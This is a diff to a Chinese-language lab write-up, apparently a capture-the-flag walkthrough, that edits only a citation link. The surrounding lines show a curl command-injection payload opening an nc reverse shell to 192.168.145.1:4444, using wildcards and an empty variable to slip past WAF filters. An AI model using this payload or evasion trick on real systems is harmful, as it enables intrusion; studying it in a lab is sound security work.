@@ -51,7 +51,7 @@ accent_color:          '#4fb1ba'
   3. curl -s 'http://192.168.145.5/test.php?file=%26/b?n/nc$u%20-e%20/b?n/sh$u%20192.168.145.1%204444'
 
 >
-  **NOTE**:此处主要利用到了两个知识点：1是linux下所有皆文件，因此各种可执行程序都是在可找到的文件，而在找文件的过程中是可以利用通配符的，可以利用该特性对过滤进行绕过，另一点就是使用空变量$u，linux中是可以存在空变量的，直接被系统视为空字符串，空变量不会对输出造成影响，可以借此来绕过基于正则表达式的过滤器和模式匹配此处参见secist大佬['绕过CloudFlare WAF和ModSecurity OWASP CRS3核心规则集的技巧介绍'](https://www.freebuf.com/articles/web/184414.html)的文章
+  **NOTE**:此处主要利用到了两个知识点：1是linux下所有皆文件，因此各种可执行程序都是在可找到的文件，而在找文件的过程中是可以利用通配符的，可以利用该特性对过滤进行绕过，另一点就是使用空变量$u，linux中是可以存在空变量的，直接被系统视为空字符串，空变量不会对输出造成影响，可以借此来绕过基于正则表达式的过滤器和模式匹配此处参见['secist'](https://www.freebuf.com/author/secist)大佬['绕过CloudFlare WAF和ModSecurity OWASP CRS3核心规则集的技巧介绍'](https://www.freebuf.com/articles/web/184414.html)的文章
 
 14. 现在可以getshell了，先监听端口4444(（由于我的网络是靶机为仅host模式，而kali为nat模式通过将物理机的4444网卡映射到了kali上，所以此处看到的是来自10.0.2.2的连接，这不是重点）)
     ![Full-width image](/assets/img/docs/MlnUV1/18.png)
